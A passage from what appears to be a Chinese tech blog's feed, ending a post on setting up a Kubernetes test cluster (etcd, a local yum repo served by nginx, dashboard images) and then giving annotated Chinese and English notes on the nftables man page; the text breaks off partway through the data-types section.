d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>每个节点的hostname将被设置成虚拟机的名字，同时vminit脚本会把本地的ssh公钥和私钥都拷贝到虚拟机节点，这样初始化之后的节点可以通过相同的密钥互相免密登录，注意这样的操作仅适用于快速搭建测试环境，生产环境千万不要这么处理。打通免密ssh是因为后面部署k8s时会用到。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="搭建etcd集群">搭建etcd集群<a class="hash-link" href="#搭建etcd集群" title="标题的直接链接">​</a></h2><p>在部署k8s集群之前，我们需要先部署一个独立的etcd集群，k8s会用到这个集群。这里我采用ansible playbook来部署，playbook已经分享到github上面，（<a href="https://github.com/itxx00/ansible-etcd%EF%BC%89%EF%BC%8C%E6%8C%89%E7%85%A7repo%E4%B8%AD%E7%9A%84readme%E6%9D%A5%E5%87%86%E5%A4%87%E5%A5%BD%E9%9B%86%E7%BE%A4%E3%80%82" target="_blank" rel="noopener noreferrer">https://github.com/itxx00/ansible-etcd），按照repo中的readme来准备好集群。</a></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="准备镜像仓库">准备镜像仓库<a class="hash-link" href="#准备镜像仓库" title="标题的直接链接">​</a></h2><p>将下载下来的k8s rpm包和docker镜像放到/data/k8s-deploy目录，其中rpms目录存放了需要用到的rpm包，images目录存放需要用到的docker镜像，因原脚本中不包含k8s dashboard（一套web ui管理界面），为了能够部署dashboard，对原脚本作了修改增加了部署dashboard的选项，部署dashboard需要一些额外的docker镜像和配置文件，这里先补充好docker镜像：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">yum -y install docker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl start docker</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker pull googlecontainer/kubernetes-dashboard-amd64:v1.6.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker pull googlecontainer/heapster-influxdb-amd64:v1.1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker pull googlecontainer/heapster-grafana-amd64:v4.0.2</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker pull googlecontainer/heapster-amd64:v1.3.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd /data/k8s-deploly/images</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker save googlecontainer/kubernetes-dashboard-amd64 -o kubernetes-dashboard-amd64_v1.6.1.tar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker save googlecontainer/heapster-influxdb-amd64 -o heapster-influxdb-amd64_v1.1.1.tar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker save googlecontainer/heapster-grafana-amd64 -o heapster-grafana-amd64_v4.0.2.tar</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker save googlecontainer/heapster-amd64 -o heapster-amd64_v1.3.0.tar</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>原脚本中安装rpm包是在各节点下载好后本地安装的，我改进了一下采用yum方式安装，准备yum仓库：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">createrepo /data/k8s-deploy/rpms</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">yum -y install nginx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cat &gt;/etc/nginx/conf.d/k8srepo.conf &lt;&lt;EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">server {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    listen       8000;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    server_name  _;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    root         /data/k8s-deploy;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    autoindex on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    location / {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        autoindex on;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EOF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">systemctl restart nginx</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>至此yum repo和docker镜像准备完成。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="部署k8s集群">部署k8s集群<a class="hash-link" href="#部署k8s集群" title="标题的直接链接">​</a></h2><p>部署过程参考<a href="https://github.com/5xops/k8s-deploy/blob/master/README.md" target="_blank" rel="noopener noreferrer">https://github.com/5xops/k8s-deploy/blob/master/README.md</a> ，需要修改repo中的k8slocal.repo文件中ip地址为yum仓库对应的ip地址，部署master、minion和replica可参考master.sh，minon.sh, replica.sh的内容。
需要注意的是为了部署dashboard服务我们额外增加了dashboard相关的配置文件，具体增加的内容请参考这个commit： <a href="https://github.com/5xops/k8s-deploy/commit/1766a675d76edb32f310acd98d5c6ed50a356e5b" target="_blank" rel="noopener noreferrer">https://github.com/5xops/k8s-deploy/commit/1766a675d76edb32f310acd98d5c6ed50a356e5b</a></p><p>至此，k8s测试环境及搭建完成，后续我将使用这个k8s测试环境来部署其他服务，后面会慢慢分享。</p>]]></content>
        <category label="k8s" term="k8s"/>
        <category label="kubernetes" term="kubernetes"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[nftables：nft man文档阅读笔记]]></title>
        <id>/2017/06/13/nftables-man-page</id>
        <link href="https://itxx00.github.io/notes/blog/2017/06/13/nftables-man-page"/>
        <updated>2017-06-13T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[这里是一份nft man文档笔记]]></summary>
        <content type="html"><![CDATA[<blockquote><p>利用空闲时间学习了nftables的基础知识，其中官方的man page中包含了大量信息，在阅读过程中整理了一份带中文注释的笔记，以辅助加深记忆。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="工具名称">工具名称<a class="hash-link" href="#工具名称" title="标题的直接链接">​</a></h2><p>nft&nbsp;--&nbsp; 包过滤规则管理工具</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="基本用法">基本用法<a class="hash-link" href="#基本用法" title="标题的直接链接">​</a></h2><p><code>nft [ -n | --numeric ] [ -s | --stateless ] [ [-I | --includepath] directory ] [ [-f | --file] filename | [-i | --interactive] | cmd ]</code></p><p><code>nft [ -h | --help ] [ -v | --version ]</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="工具描述">工具描述<a class="hash-link" href="#工具描述" title="标题的直接链接">​</a></h2><p>nftables 作为新一代的防火墙策略框架，旨在替代之前的各种防火墙工具诸如iptables/ebtables等，而且提供了类似tc的带宽限速能力。而nft则提供了nftables的命令行入口，是用户空间的管理工具。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="选项说明">选项说明<a class="hash-link" href="#选项说明" title="标题的直接链接">​</a></h2><p>执行<code>nft --help</code>查看完整帮助信息</p><p><code>-h, --help</code></p><dd><p>查看帮助信息.</p></dd><p><code>-v, --version</code></p><dd><p>查看版本号.</p></dd><p><code>-n, --numeric</code></p><dd><p>以数值方式展示数据，可重复使用，一个-n表示不解析域名，第二次不解析端口号，第三次不解析协议和uid/gid。</p></dd><p><code>-s, --stateless</code></p><dd><p>省略规则和有状态对象的状态信息</p></dd><p><code>-N</code></p><dd><p>将ip地址解析成域名，依赖dns解析。</p></dd><p><code>-a, --handle</code></p><dd><p>输出内容中展示规则handle信息</p></dd><p><code>-I, --includepath directory</code></p><dd><p>添加include文件搜索目录</p></dd><p><code>-f, --file filename</code></p><dd><p>从文件获取输入</p></dd><p><code>-i, --interactive</code></p><dd><p>从交互式cli获取输入</p></dd><h2 class="anchor anchorWithStickyNavbar_LWe7" id="文件格式">文件格式<a class="hash-link" href="#文件格式" title="标题的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="语法规定">语法规定<a class="hash-link" href="#语法规定" title="标题的直接链接">​</a></h3><p>单行过长可用<code>\</code>换行连接；
多个命令写到同一行可用分号<code>;</code> 分隔；
注释使用井号<code>#</code>打头；
标识符用大小写字母打头，后面跟数字字母下划线正斜杠反斜杠以及点号;
用双引号引起来表示纯字符串。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="文件引用">文件引用<a class="hash-link" href="#文件引用" title="标题的直接链接">​</a></h3><p><code>include "filename"</code></p><p>可由外部文件通过<code>include</code>导入到当前文件，用<code>-I/--includepath</code>指定导入文件所在目录，如果include后面接的是目录而非文件，则整个目录的文件将以字母顺序依次导入。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="符号变量">符号变量<a class="hash-link" href="#符号变量" title="标题的直接链接">​</a></h3><p><code>define variable = expr</code></p><p><code>$variable</code></p><p>Symbolic variables can be defined using the <strong><em>define</em></strong> statement. Variable references are expressions and can be used initialize other variables. The scope of a definition is the current block and all blocks contained within.
变量使用<code>define</code>定义，变量引用属于表达式，可以用于初始化其他变量，变量的生效范围在当前block以及被包含的所有block内。</p><p><strong><em>示例 1. 使用符号变量</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">define int_if1 = eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">define int_if2 = eth1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">define int_ifs = { $int_if1, $int_if2 }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter input iif $int_ifs accept</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="地址族">地址族<a class="hash-link" href="#地址族" title="标题的直接链接">​</a></h2><p>根据处理的包的种类不同可以将其分为不同的地址族。不同的地址族在内核中包含有特定阶段的处理路径和hook点，当对应hook的规则存在时则会被nftables处理。具体类型如下：</p><p><code>ip</code></p><dd><p>IPv4 地址族</p></dd><p><code>ip6</code></p><dd><p>IPv6 地址族</p></dd><p><code>inet</code></p><dd><p>Internet (IPv4/IPv6) 地址族</p></dd><p><code>arp</code></p><dd><p>ARP 地址族</p></dd><p><code>bridge</code></p><dd><p>Bridge 地址族</p></dd><p><code>netdev</code></p><dd><p>Netdev 地址族</p></dd><p>所有nftables对象存在于特定的地址族namespace中，换言之所有identifier都含有一个特定的地址族，如果未指定则默认使用<code>ip</code>地址族</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ipv4ipv6inet-address-families">IPv4/IPv6/Inet address families<a class="hash-link" href="#ipv4ipv6inet-address-families" title="标题的直接链接">​</a></h3><p>IPv4/IPv6/Inet 地址族用于处理 IPv4和IPv6包，其在network stack中在不同的包处理阶段一共包含了5个hook.</p><p><strong><em>Table 1. IPv4/IPv6/Inet 地址类hook列表</em></strong></p><table><thead><tr><th>Hook名称</th><th>描述</th></tr></thead><tbody><tr><td>prerouting</td><td>所有进入到系统的包都会被prerouting hook进行处理. 它在routing流程之前就被发起，用于靠前阶段的包过滤或者更改影响routing的包属性.</td></tr><tr><td>input</td><td>发往本地系统的包将被input hook处理.</td></tr><tr><td>forward</td><td>被转发到其他主机的包会经由forward hook处理.</td></tr><tr><td>output</td><td>由本地进程发送出去的包将被output hook处理.</td></tr><tr><td>postrouting</td><td>所有离开系统的包都将被postrouting hook处理.</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="arp-address-family">ARP address family<a class="hash-link" href="#arp-address-family" title="标题的直接链接">​</a></h3><p>ARP地址族用于处理经由系统接收和发送的ARP包。一般在集群环境中对ARP包进行mangle处理以支持clustering。</p><p><strong><em>Table 2. ARP address family hooks</em></strong></p><table><thead><tr><th>Hook</th><th>描述</th></tr></thead><tbody><tr><td>input</td><td>分发到本机的包会经过input hook.</td></tr><tr><td>output</td><td>由本机发出的包会经过output hook.</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="bridge-address-family">Bridge address family<a class="hash-link" href="#bridge-address-family" title="标题的直接链接">​</a></h3><p>bridge地址族处理通过桥接设备的ethernet包。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="netdev-address-family">Netdev address family<a class="hash-link" href="#netdev-address-family" title="标题的直接链接">​</a></h3><p>Netdev地址族处理从ingress过来的包。</p><p><strong><em>Table 3. Netdev address family hooks</em></strong></p><table><thead><tr><th>Hook</th><th>Description</th></tr></thead><tbody><tr><td>ingress</td><td>所有进入系统的包都将被ingress hook处理。它在进入layer 3之前的阶段就开始处理。</td></tr></tbody></table><h2 class="anchor anchorWithStickyNavbar_LWe7" id="tables">Tables<a class="hash-link" href="#tables" title="标题的直接链接">​</a></h2><p><code>{add | delete | list | flush} table [family] {table}</code></p><p>table是chain/set/stateful object的容器，table由其地址族和名字做标识。地址族必须属于ip, ip6, arp, bridge, netdev中的一种，inet地址族是一个虚拟地址族，同来创建同时包含IPv4和IPv6的table，如果没有指定地址族则默认使用<code>ip</code>地址族。</p><p><code>add</code></p><dd><p>添加指定地址族，指定名称的table</p></dd><p><code>delete</code></p><dd><p>删除指定的table</p></dd><p><code>list</code></p><dd><p>列出指定table中的所有chain和rule</p></dd><p><code>flush</code></p><dd><p>清除指定table中的所有chain和rule</p></dd><h2 class="anchor anchorWithStickyNavbar_LWe7" id="chains">Chains<a class="hash-link" href="#chains" title="标题的直接链接">​</a></h2><p><code>{add} chain [family] {table} {chain} {hook} {priority} {policy} {device}</code></p><p><code>{add | create | delete | list | flush} chain [family] {table} {chain}</code></p><p><code>{rename} chain [family] {table} {chain} {newname}</code></p><p>chain是rule的容器，他们存在于两种类型，基础链（base chain）和常规链（regular chain）。base chain是网络栈中数据包的入口点，regular chain则可用于jump的目标并对规则进行更好地组织。</p><p><code>add</code></p><dd><p>在指定table中添加新的链，当hook和权重值被指定时，添加的chain为base chain，将在网络栈中hook相关联。</p></dd><p><code>create</code></p><dd><p>与<code>add</code>命令类似，不同之处在于当创建的chain存在时会返回错误。</p></dd><p><code>delete</code></p><dd><p>删除指定的chain，被删除的chain不能有规则且不能是跳转目标chain。</p></dd><p><code>rename</code></p><dd><p>重命名chain</p></dd><p><code>list</code></p><dd><p>列出指定chain中的所有rule</p></dd><p><code>flush</code></p><dd><p>清除指定chain中所有rule</p></dd><h2 class="anchor anchorWithStickyNavbar_LWe7" id="rules">Rules<a class="hash-link" href="#rules" title="标题的直接链接">​</a></h2><p><code>[add | insert] rule [family] {table} {chain} [position position] {statement...}</code></p><p><code>{delete} rule [family] {table} {chain} {handle handle}</code></p><p>Rules are constructed from two kinds of components according to a set of grammatical rules: expressions and statements.</p><p><code>add</code></p><dd><p>Add a new rule described by the list of statements. The rule is appended to the given chain unless a position is specified, in which case the rule is appended to the rule given by the position.</p></dd><p><code>insert</code></p><dd><p>Similar to the <strong><em>add</em></strong> command, but the rule is prepended to the beginning of the chain or before the rule at the given position.</p></dd><p><code>delete</code></p><dd><p>Delete the specified rule.</p></dd><h2 class="anchor anchorWithStickyNavbar_LWe7" id="sets">Sets<a class="hash-link" href="#sets" title="标题的直接链接">​</a></h2><p><code>{add} set family] {table} {set}{ {type} [flags] [timeout] [gc-interval] [elements] [size] [policy]}</code></p><p><code>{delete | list | flush} set [family] {table} {set}</code></p><p><code>{add | delete} element [family] {table} {set}{ {elements}}</code></p><p>Sets are elements containers of an user-defined data type, they are uniquely identified by an user-defined name and attached to tables.
sets 是用户定义的数据类型的容器，具有用户定义的唯一标识，被应用到table上。</p><p><code>add</code></p><dd><p>在指定的table中添加一个新的set</p></dd><p><code>delete</code></p><dd><p>删除指定set</p></dd><p><code>list</code></p><dd><p>查看set内的元素</p></dd><p><code>flush</code></p><dd><p>清空整个set</p></dd><p><code>add element</code></p><dd><p>往set中添加元素，多个使用逗号分隔</p></dd><p><code>delete element</code></p><dd><p>从set中删除元素，多个使用逗号分隔</p></dd><p><strong><em>Table 4. Set 参数</em></strong></p><table><thead><tr><th>关键字</th><th>描述</th><th>类型</th></tr></thead><tbody><tr><td>type</td><td>元素的数据类型</td><td>string: ipv4_addr, ipv6_addr, ether_addr, inet_proto, inet_service, mark</td></tr><tr><td>flags</td><td>set flags</td><td>string: constant, interval, timeout</td></tr><tr><td>timeout</td><td>元素在set中的存活时间</td><td>string, 带单位的小数. 单位: d, h, m, s</td></tr><tr><td>gc-interval</td><td>垃圾回收间隔, 仅当timeout或flag timeout设置时生效</td><td>string, decimal followed by unit. Units are: d, h, m, s</td></tr><tr><td>elements</td><td>set中包含的元素</td><td>set data type</td></tr><tr><td>size</td><td>set可存放的最大元素个数</td><td>unsigned integer (64 bit)</td></tr><tr><td>policy</td><td>set policy</td><td>string: performance <!-- -->[default]<!-- -->, memory</td></tr></tbody></table><h2 class="anchor anchorWithStickyNavbar_LWe7" id="maps">Maps<a class="hash-link" href="#maps" title="标题的直接链接">​</a></h2><p><code>{add} map [family] {table} {map}{ {type} [flags] [elements] [size] [policy]}</code></p><p><code>{delete | list | flush} map [family] {table} {map}</code></p><p><code>{add | delete} element [family] {table} {map}{ {elements}}</code></p><p>Maps store data based on some specific key used as input, they are uniquely identified by an user-defined name and attached to tables.</p><p><code>add</code></p><dd><p>Add a new map in the specified table.</p></dd><p><code>delete</code></p><dd><p>Delete the specified map.</p></dd><p><code>list</code></p><dd><p>Display the elements in the specified map.</p></dd><p><code>flush</code></p><dd><p>Remove all elements from the specified map.</p></dd><p><code>add element</code></p><dd><p>Comma-separated list of elements to add into the specified map.</p></dd><p><code>delete element</code></p><dd><p>Comma-separated list of element keys to delete from the specified map.</p></dd><p><strong><em>Table 5. Map specifications</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>type</td><td>data type of map elements</td><td>string ':' string: ipv4_addr, ipv6_addr, ether_addr, inet_proto, inet_service, mark, counter, quota. Counter and quota can't be used as keys</td></tr><tr><td>flags</td><td>map flags</td><td>string: constant, interval</td></tr><tr><td>elements</td><td>elements contained by the map</td><td>map data type</td></tr><tr><td>size</td><td>maximun number of elements in the map</td><td>unsigned integer (64 bit)</td></tr><tr><td>policy</td><td>map policy</td><td>string: performance <!-- -->[default]<!-- -->, memory</td></tr></tbody></table><h2 class="anchor anchorWithStickyNavbar_LWe7" id="stateful-objects">Stateful objects<a class="hash-link" href="#stateful-objects" title="标题的直接链接">​</a></h2><p><code>{add | delete | list | reset} type [family] {table} {object}</code></p><p>Stateful objects are attached to tables and are identified by an unique name. They group stateful information from rules, to reference them in rules the keywords "type name" are used e.g. "counter name".</p><p><code>add</code></p><dd><p>Add a new stateful object in the specified table.</p></dd><p><code>delete</code></p><dd><p>Delete the specified object.</p></dd><p><code>list</code></p><dd><p>Display stateful information the object holds.</p></dd><p><code>reset</code></p><dd><p>List-and-reset stateful object.</p></dd><h3 class="anchor anchorWithStickyNavbar_LWe7" id="ct">Ct<a class="hash-link" href="#ct" title="标题的直接链接">​</a></h3><p><strong><em>ct</em></strong> {helper} {type} {type} {protocol} {protocol} <!-- -->[l3proto][family]</p><p>Ct helper is used to define connection tracking helpers that can then be used in combination with the "ct helper set" statement. type and protocol are mandatory, l3proto is derived from the table family by default, i.e. in the inet table the kernel will try to load both the ipv4 and ipv6 helper backends, if they are supported by the kernel.</p><p><strong><em>Table 6. conntrack helper specifications</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>type</td><td>name of helper type</td><td>quoted string (e.g. "ftp")</td></tr><tr><td>protocol</td><td>layer 4 protocol of the helper</td><td>string (e.g. tcp)</td></tr><tr><td>l3proto</td><td>layer 3 protocol of the helper</td><td>address family (e.g. ip)</td></tr></tbody></table><p><strong><em>示例 2. defining and assigning ftp helper</em></strong></p><p>Unlike iptables, helper assignment needs to be performed after the conntrack lookup has completed, for example with the default 0 hook priority.</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">table inet myhelpers {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  ct helper ftp-standard {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">     type "ftp" protocol tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  chain prerouting {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      type filter hook prerouting priority 0;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      tcp dport 21 ct helper set "ftp-standard"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="counter">Counter<a class="hash-link" href="#counter" title="标题的直接链接">​</a></h3><p><strong><em>counter</em></strong> <!-- -->[packets bytes]</p><p><strong><em>Table 7. Counter specifications</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>packets</td><td>initial count of packets</td><td>unsigned integer (64 bit)</td></tr><tr><td>bytes</td><td>initial count of bytes</td><td>unsigned integer (64 bit)</td></tr></tbody></table><h3 class="anchor anchorWithStickyNavbar_LWe7" id="quota">Quota<a class="hash-link" href="#quota" title="标题的直接链接">​</a></h3><p><strong><em>quota</em></strong> <!-- -->[over | until][used]</p><p><strong><em>Table 8. Quota specifications</em></strong></p><table><thead><tr><th>Keyword</th><th>Description</th><th>Type</th></tr></thead><tbody><tr><td>quota</td><td>quota limit, used as the quota name</td><td>Two arguments, unsigned interger (64 bit) and string: bytes, kbytes, mbytes. "over" and "until" go before these arguments</td></tr><tr><td>used</td><td>initial value of used quota</td><td>Two arguments, unsigned interger (64 bit) and string: bytes, kbytes, mbytes</td></tr></tbody></table><h2 class="anchor anchorWithStickyNavbar_LWe7" id="expressions">Expressions<a class="hash-link" href="#expressions" title="标题的直接链接">​</a></h2><p>Expressions represent values, either constants like network addresses, port numbers etc. or data gathered from the packet during ruleset evaluation. Expressions can be combined using binary, logical, relational and other types of expressions to form complex or relational (match) expressions. They are also used as arguments to certain types of operations, like NAT, packet marking etc.</p><p>Each expression has a data type, which determines the size, parsing and representation of symbolic values and type compatibility with other expressions.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="describe-command">describe command<a class="hash-link" href="#describe-command" title="标题的直接链接">​</a></h3><p><code>describe {expression}</code></p><p>The <strong><em>describe</em></strong> command shows information about the type of an expression and its data type.</p><p><strong><em>示例 3. The <code>describe</code> command</em></strong></p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">$ nft describe tcp flags</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload expression, datatype tcp_flag (TCP flag) (basetype bitmask, integer), 8 bits</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pre-defined symbolic constants:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">fin                               0x01</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">syn                               0x02</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rst                               0x04</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">psh                               0x08</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ack                               0x10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">urg                               0x20</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ecn                               0x40</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cwr                               0x80</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="data-types">Data types<a class="hash-link" href="#data-types" title="标题的直接链接">​</a></h2><p>Data types determine the size, parsing and representation of symbolic values and type compatibility of expressions. A number of global data types exist, in addition some expression types define further data types specific to the expression type. Most data types have a fixed size, some however may have a dynamic size, f.i. the string type.</p><p>Types may be derived from lower order types, f.i. the IPv4 address type is derived from the integer type, meaning an IPv4 address can also be specified as an integer value.</p><p>In certain contexts (set and map definitions) it is necessary to explicitly specify a data type. Each type has a name which is used for this.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="integer-type">Integer type<a class="hash-link" href="#integer-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 9.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base type</th></tr></thead><tbody><tr><td>Integer</td><td>integer</td><td>variable</td><td>-</td></tr></tbody></table><p>The integer type is used for numeric values. It may be specified as decimal, hexadecimal or octal number. The integer type doesn't have a fixed size, its size is determined by the expression for which it is used.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="bitmask-type">Bitmask type<a class="hash-link" href="#bitmask-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 10.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base type</th></tr></thead><tbody><tr><td>Bitmask</td><td>bitmask</td><td>variable</td><td>integer</td></tr></tbody></table><p>The bitmask type (<strong><em>bitmask</em></strong>) is used for bitmasks.</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="string-type">String type<a class="hash-link" href="#string-type" title="标题的直接链接">​</a></h3><p><strong><em>Table 11.</em></strong></p><table><thead><tr><th>Name</th><th>Keyword</th><th>Size</th><th>Base 